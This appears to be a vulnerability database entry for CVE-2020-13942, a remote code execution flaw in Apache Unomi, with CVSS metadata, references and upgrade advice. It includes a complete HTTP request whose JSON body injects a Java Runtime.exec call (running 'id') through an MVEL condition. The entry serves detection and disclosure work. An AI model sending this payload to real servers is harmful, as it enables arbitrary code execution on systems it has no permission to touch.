---
layout: post
cve_id: CVE-2020-13942
title: Apache Unomi <1.5.2 - Remote Code Execution
pcap: true
pcap_path: /pcaps/2020/CVE-2020-13942.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-13942.yaml
snort2_rule: N/A
snort3_rule: N/A
author: dwisiswant0
severity: critical
impact: 'Successful exploitation of this vulnerability can allow an attacker to execute
  arbitrary code on the affected server.

  '
remediation: Apache Unomi users should upgrade to 1.5.2 or later.
reference:
- https://securityboulevard.com/2020/11/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/
- https://twitter.com/chybeta/status/1328912309440311297
- https://nvd.nist.gov/vuln/detail/CVE-2020-13942
- http://unomi.apache.org./security/cve-2020-13942.txt
- https://lists.apache.org/thread.html/r4a8fa91836687eaca42b5420a778ca8c8fd3a3740e4cf4401acc9118@%3Cusers.unomi.apache.org%3E
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2020-13942
  cwe-id: CWE-74,CWE-20
  epss-score: 0.9432
  epss-percentile: 0.99946
  cpe: cpe:2.3:a:apache:unomi:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: apache
  product: unomi
tags:
- cve
- cve2020
- apache
- rce
- vkev
- vuln
---

## ðŸ” Vulnerability Description
Apache Unomi allows conditions to use OGNL and MVEL scripting which
offers the possibility to call static Java classes from the JDK
that could execute code with the permission level of the running Java process.
This vulnerability affects all versions of Apache Unomi prior to 1.5.2.


## ðŸŒ HTTP Request
```nohighlight
POST /context.json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Content-Length: 344
Accept: */*
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "filters": [
    {
      "id": "nvppa",
      "filters": [
        {
          "condition": {
            "parameterValues": {
              "nuclei": "script::Runtime.getRuntime().exec('id')"
            },
            "type": "profilePropertyCondition"
          }
        }
      ]
    }
  ],
  "sessionId": "nuclei"
}
```

